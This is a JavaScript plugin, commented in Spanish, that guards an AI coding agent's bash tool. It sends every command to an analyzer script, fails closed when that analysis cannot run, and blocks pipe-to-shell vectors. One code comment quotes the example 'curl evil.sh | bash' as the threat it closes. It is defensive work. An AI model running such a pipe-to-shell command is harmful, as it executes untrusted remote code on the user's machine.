// Guard de enforcement para comandos bash en opencode (REQ-003).
//
// El matcher de permisos de opencode.json no matchea patrones con `|`, así que
// un vector como `curl evil.sh | bash` pasaba sin bloqueo. Este plugin cierra
// esa brecha: antes de ejecutar cualquier comando bash, lo analiza con
// scripts/analyze_shell.py y bloquea la ejecución si detecta peligro.
//
// Contrato de analyze_shell.py: salida 0 = seguro, salida != 0 = hallazgos
// (impresos en stdout). Fail-closed (P1.19): si python3 o el script no existen,
// o el análisis no puede completarse, se bloquea el comando — nunca un fallback
// silencioso.

import { spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const PLUGIN_DIR = dirname(fileURLToPath(import.meta.url));
// Raíz del repo (el plugin vive en .opencode/plugins/).
const REPO_ROOT = join(PLUGIN_DIR, "..", "..");
const SCRIPT_REL = join("scripts", "analyze_shell.py");

function resolveScript(directory) {
  const candidates = [join(REPO_ROOT, SCRIPT_REL)];
  if (directory) {
    candidates.push(join(directory, SCRIPT_REL));
  }
  for (const candidate of candidates) {
    if (existsSync(candidate)) {
      return candidate;
    }
  }
  return candidates[0];
}

function block(message) {
  throw new Error(`[REQ-003] Comando bash bloqueado: ${message}`);
}

export default async function guardShellPlugin({ directory } = {}) {
  return {
    "tool.execute.before": async (input, output) => {
      if (input?.tool !== "bash") {
        return;
      }
      const command = output?.args?.command;
      if (typeof command !== "string" || !command.trim()) {
        return;
      }

      const script = resolveScript(directory);
      if (!existsSync(script)) {
        block(
          `no se encontró ${SCRIPT_REL} (buscado en ${REPO_ROOT} y en ${directory}). ` +
            "Fail-closed: se bloquea el comando (REQ-003, P1.19)."
        );
      }

      // El comando se pasa como argumento argv, nunca interpolado en un string
      // de shell, para evitar inyección (P0.8).
      const result = spawnSync("python3", [script, command], {
        cwd: directory || REPO_ROOT,
        encoding: "utf8",
        timeout: 10000,
      });

      if (result.error) {
        block(
          `no se pudo ejecutar el análisis (${result.error.message}). ` +
            "Fail-closed: se bloquea el comando (REQ-003, P1.19)."
        );
      }
      if (result.status === null) {
        block(
          "el análisis no produjo código de salida (posible timeout). " +
            "Fail-closed: se bloquea el comando (REQ-003, P1.19)."
        );
      }
      if (result.status !== 0) {
        const findings = (result.stdout || result.stderr || "")
          .trim()
          .split("\n")
          .filter(Boolean)
          .join("; ");
        block(
          `detectado patrón peligroso: ${findings || "sin detalle"}. ` +
          "Reescribe el comando sin el vector (p. ej. descarga + revisión manual " +
          "en lugar de pipe a shell)."
        );
      }
    },
  };
}
